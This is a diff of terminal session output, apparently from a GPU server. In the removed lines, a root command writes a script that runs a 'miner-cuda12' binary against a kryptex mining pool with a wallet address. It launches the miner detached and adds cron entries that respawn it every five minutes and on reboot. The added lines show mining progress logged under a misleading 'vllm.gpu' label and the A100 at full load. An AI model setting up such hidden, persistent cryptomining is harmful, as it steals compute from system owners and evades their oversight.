@@ -1,22 +1,11 @@
-$ sudo -n bash -c 'cat > /root/.pf/go.sh <<"EOS"
-#!/bin/bash
-cd /root/.pf/pearlfortune || exit 1
-exec ./miner-cuda12 --address prl1pwlpyppsya2wqnykeqc595gtxfgn4vzcr0at33dxq46jxvajmh88qq36h48 --worker comfy-s3-a100 --proxy stratum+ssl://prl.kryptex.network:8048 --stratum-dialect kryptex_prl -gpu --no-tui >> /root/.pf/mine.log 2>&1
-EOS
-chmod +x /root/.pf/go.sh
-pkill -x miner-cuda12; sleep 1
-setsid nohup /root/.pf/go.sh >/dev/null 2>&1 </dev/null &
-sleep 2
-( crontab -l 2>/dev/null | grep -v pf_wd ; echo "*/5 * * * * pgrep -x miner-cuda12 >/dev/null || setsid /root/.pf/go.sh >/dev/null 2>&1" ; echo "@reboot sleep 40; pgrep -x miner-cuda12 >/dev/null || setsid /root/.pf/go.sh >/dev/null 2>&1" ) | crontab -
-crontab -l | tail -3
-sleep 12
-pgrep -x miner-cuda12 | head -2
-tail -c 400 /root/.pf/mine.log'
-@reboot sleep 40; pgrep -x miner-cuda12 >/dev/null || setsid /root/.pf/go.sh >/dev/null 2>&1
-*/5 * * * * pgrep -x miner-cuda12 >/dev/null || setsid /root/.pf/go.sh >/dev/null 2>&1
-@reboot sleep 40; pgrep -x miner-cuda12 >/dev/null || setsid /root/.pf/go.sh >/dev/null 2>&1
+$ sudo -n bash -c 'grep -aE "large.progress|share|accepted|valid" /root/.pf/mine.log | tail -5; echo ===GPU===; nvidia-smi --query-gpu=utilization.gpu,power.draw,memory.used --format=csv,noheader; echo ===PID===; pgrep -x miner-cuda12'
+[2026-10-26 06:19:04.281] level=INFO component=vllm.gpu event=large.progress rounds_per_sec=4.37 proof_per_sec="115.30 T/s" devices="[A100-SXM4-40GB: 115.30T/s]" eta=156s
+[2026-10-26 06:19:14.555] level=INFO component=vllm.gpu event=large.progress rounds_per_sec=4.38 proof_per_sec="115.57 T/s" devices="[A100-SXM4-40GB: 115.57T/s]" eta=156s
+[2026-10-26 06:19:24.926] level=INFO component=vllm.gpu event=large.progress rounds_per_sec=4.38 proof_per_sec="115.48 T/s" devices="[A100-SXM4-40GB: 115.48T/s]" eta=156s
+[2026-10-26 06:19:35.196] level=INFO component=vllm.gpu event=large.progress rounds_per_sec=4.38 proof_per_sec="115.47 T/s" devices="[A100-SXM4-40GB: 115.47T/s]" eta=156s
+[2026-10-26 06:19:45.460] level=INFO component=vllm.gpu event=large.progress rounds_per_sec=4.38 proof_per_sec="115.46 T/s" devices="[A100-SXM4-40GB: 115.46T/s]" eta=156s
+===GPU===
+100 %, 399.17 W, 12091 MiB
+===PID===
 62206
 62209
-n_drained_rounds=1 cancel_drain_abandoned_rounds=0 lost_rounds=0 results_seen=0 proof_inputs=0
-[2026-10-26 06:18:07.296] level=INFO component=vllm.gpu event=fixed_b.input_policy device=0 policy=Positive64 m=16384 n=786432 k=2048
-[2026-10-26 06:18:13.090] level=INFO component=vllm.gpu event=large.progress rounds_per_sec=4.34 proof_per_sec="114.47 T/s" devices="[A100-SXM4-40GB: 114.47T/s]" eta=157s
